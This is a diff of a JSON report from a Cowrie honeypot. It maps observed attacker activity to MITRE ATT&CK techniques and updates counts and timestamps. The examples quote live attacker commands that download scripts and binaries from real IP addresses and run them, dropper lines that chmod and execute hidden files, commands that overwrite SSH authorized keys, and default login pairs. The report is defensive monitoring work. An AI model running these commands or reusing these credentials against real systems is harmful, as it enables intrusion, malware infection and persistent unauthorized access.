@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-25 14:03:46",
+  "generated": "2026-09-25 15:02:54",
   "totals": {
-    "commands": 2751,
-    "login_failed": 4113,
-    "login_success": 220,
-    "sessions": 4764
+    "commands": 2887,
+    "login_failed": 4520,
+    "login_success": 233,
+    "sessions": 5213
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4113,
+      "count": 4520,
       "examples": [
         "root / casa",
         "root / router",
@@ -21,14 +21,14 @@
         "Admin / "
       ],
       "first": "2026-09-25T00:01:09.150965Z",
-      "last": "2026-09-25T14:03:45.569529Z",
-      "unique_ips": 112
+      "last": "2026-09-25T15:01:44.663932Z",
+      "unique_ips": 117
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 1019,
+      "count": 1080,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -37,8 +37,8 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-25T00:02:44.887220Z",
-      "last": "2026-09-25T13:58:48.866991Z",
-      "unique_ips": 70
+      "last": "2026-09-25T14:51:24.954224Z",
+      "unique_ips": 72
     },
     {
       "id": "T1082",
@@ -60,7 +60,7 @@
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 220,
+      "count": 233,
       "examples": [
         "root / root",
         "adm / adm",
@@ -69,14 +69,14 @@
         "admin / password"
       ],
       "first": "2026-09-25T00:02:39.589537Z",
-      "last": "2026-09-25T13:58:46.674542Z",
-      "unique_ips": 94
+      "last": "2026-09-25T14:51:22.612724Z",
+      "unique_ips": 97
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 96,
+      "count": 98,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -85,8 +85,8 @@
         "cd /tmp||cd /var/tmp||cd /; (wget -q -O- http://176.65.139.196/bins/kla.sh | sh || curl -s http://176.65.139.196/bins/kl"
       ],
       "first": "2026-09-25T00:20:41.496654Z",
-      "last": "2026-09-25T13:29:27.386142Z",
-      "unique_ips": 45
+      "last": "2026-09-25T14:18:10.025373Z",
+      "unique_ips": 46
     },
     {
       "id": "T1033",
@@ -138,13 +138,14 @@
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 36,
+      "count": 37,
       "examples": [
-        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1"
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
+        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
       ],
       "first": "2026-09-25T01:31:37.738788Z",
-      "last": "2026-09-25T13:29:27.087345Z",
-      "unique_ips": 36
+      "last": "2026-09-25T14:17:58.332964Z",
+      "unique_ips": 37
     },
     {
       "id": "T1070.004",
@@ -235,31 +236,31 @@
   "unmapped": [
     [
       "/bin/busybox HISILICON",
-      219
+      234
     ],
     [
       "sh",
-      156
+      166
     ],
     [
       "shell",
-      156
+      166
     ],
     [
       "system",
-      154
+      164
     ],
     [
       "enable",
-      153
+      163
     ],
     [
       "ping; sh",
-      146
+      156
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      73
+      78
     ],
     [
       "/bin/busybox",
